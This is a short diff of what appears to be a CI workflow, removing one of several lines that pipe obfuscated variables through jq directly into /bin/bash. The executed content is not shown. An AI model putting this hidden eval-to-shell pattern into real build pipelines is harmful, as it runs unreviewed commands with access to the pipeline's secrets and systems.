@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$hdiiy10521" | jq -r .f3 | /bin/bash
           printf '%s' "$v38" | jq -r .vj19404 | /bin/bash
-          printf '%s' "$iya28" | jq -r .s3 | /bin/bash
           printf '%s' "$gvx8" | jq -r .sy7 | /bin/bash
 
       - name: Upload output
